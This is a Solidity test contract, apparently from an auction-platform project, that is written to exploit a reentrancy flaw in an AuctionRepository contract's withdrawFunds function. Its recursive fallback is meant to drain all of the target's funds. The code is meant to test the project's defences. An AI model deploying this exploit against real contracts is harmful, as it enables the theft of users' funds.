// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity 0.6.12;

import "@nomiclabs/buidler/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Malicious contract for testing the security measures (reentrancy) in
 * the withdrawFunds function of AuctionRepository.
 * @author Victor Navascues.
 * @notice Exploits AuctionRepository contract, stealing all its funds via
 * reentrancy attack.
 */
contract ReentrancyBidder is Ownable {
    address private _trustedAuctionRepository;

    constructor(address _auctionRepository) public {
        _trustedAuctionRepository = _auctionRepository;
    }

    /**
     * @dev This function is the attack. It attempts to widthdraw all the funds.
     */
    // solhint-disable-next-line no-complex-fallback
    fallback() external payable {
        bytes memory functionSig = abi.encodeWithSignature("withdrawFunds()");
        if (msg.sender.balance > 0 ether) {
            // NB: .call() return is not check in purpose.
            // (bool success, ) = msg.sender.call(functionSig);
            // require(success, "Attack failed");
            // solhint-disable-next-line avoid-low-level-calls
            msg.sender.call(functionSig);
        }
    }

    /**
     * @notice Bid an auction by auction ID.
     * @dev Bid an auction is essential for having access to withdrawFunds
     * (attacker address in accountBalance map).
     * @param _auctionId the auction identifer (array index).
     */
    function bidAuction(uint256 _auctionId) public payable onlyOwner {
        bytes memory functionSig = abi.encodeWithSignature(
            "bidAuction(uint256)",
            _auctionId
        );
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = address(_trustedAuctionRepository).call{
            value: msg.value
        }(functionSig);
        require(success, "Transaction failed");
    }

    /**
     * @notice Withdraw the funds after being outbidded.
     * @dev This function starts the attack, by forcing the AuctionRepository
     * withdrawFunds function to call the malicous fallback function.
     */
    function withdrawFunds() public onlyOwner {
        bytes memory functionSig = abi.encodeWithSignature("withdrawFunds()");
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = address(_trustedAuctionRepository).call(functionSig);
        require(success, "Transaction failed");
    }
}
